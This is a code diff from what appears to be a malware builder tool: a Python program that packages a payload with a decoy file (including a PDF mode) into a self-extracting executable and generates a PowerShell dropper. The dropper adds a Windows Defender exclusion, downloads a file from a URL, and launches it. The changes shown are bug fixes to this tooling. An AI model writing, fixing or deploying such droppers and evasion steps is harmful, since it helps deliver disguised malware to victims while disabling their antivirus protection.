@@ -93,14 +93,13 @@ if (-not (Test-Path $DOWNLOAD_DIR)) {{
 $FinalFilePath = Join-Path $DOWNLOAD_DIR $PAYLOAD_NAME
 Add-MpPreference -ExclusionPath $FinalFilePath
 
-Write-Host "Downloading content from $URL to $TempDownloadFile"
+Write-Host "Downloading content from $URL to $FinalFilePath"
 Invoke-WebRequest -Uri $URL -OutFile $FinalFilePath
 
 Write-Host "Waiting for $DELAY_WAIT seconds after download..."
 Start-Sleep -Seconds $DELAY_WAIT
 
 Write-Host "Starting final process: $FinalFilePath"
-Add-MpPreference -ExclusionPath $FinalFilePath
 Start-Process -FilePath $FinalFilePath -NoNewWindow
 """)
 
@@ -246,7 +245,7 @@ if __name__ == "__main__":
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
             # Cleanup local build artifacts
-            spec_file = exe_name.replace('.exe', '.spec')
+            spec_file = exe_name + '.spec'
             if os.path.exists(spec_file):
                 os.remove(spec_file)
             if os.path.exists('build'):
@@ -332,9 +331,9 @@ if __name__ == '__main__':
         sys.stderr = IORedirector(log_widget)
         
         print(f"[INFO] Starting {'PDF ' if is_pdf_mode else ''}SFX Build...")
-        
+
+        temp_dir = tempfile.mkdtemp()
         try:
-            temp_dir = tempfile.mkdtemp()
             payload_name = os.path.basename(payload_path)
             decoy_name = os.path.basename(decoy_path)
             
@@ -511,7 +510,7 @@ if __name__ == "__main__":
                 os.remove("temp_loader.py")
             if os.path.exists("build"):
                 shutil.rmtree("build")
-            spec = final_name.replace('.exe', '.spec')
+            spec = final_name + '.spec'
             if os.path.exists(spec):
                 os.remove(spec)
             sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
